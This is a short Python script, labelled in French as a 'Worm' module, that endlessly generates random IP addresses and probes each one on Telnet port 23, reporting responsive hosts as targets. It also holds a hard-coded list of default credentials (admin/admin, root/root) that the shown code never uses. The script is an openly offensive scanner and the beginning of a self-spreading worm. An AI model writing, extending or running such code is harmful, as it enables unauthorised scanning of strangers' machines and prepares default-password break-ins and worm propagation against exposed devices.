import socket
import random

creds = [("admin", "admin"), ("root", "root"), ("admin", "password")]

def generate_random_ip():
    return ".".join(map(str, (random.randint(1, 255) for _ in range(4))))

def try_telnet_exploit(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    try:
        s.connect((ip, 23)) 
        print(f"[!] Cible potentielle trouvée : {ip}")

    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    print("[*] Lancement du module Worm...")
    while True:
        target_ip = generate_random_ip()
        try_telnet_exploit(target_ip)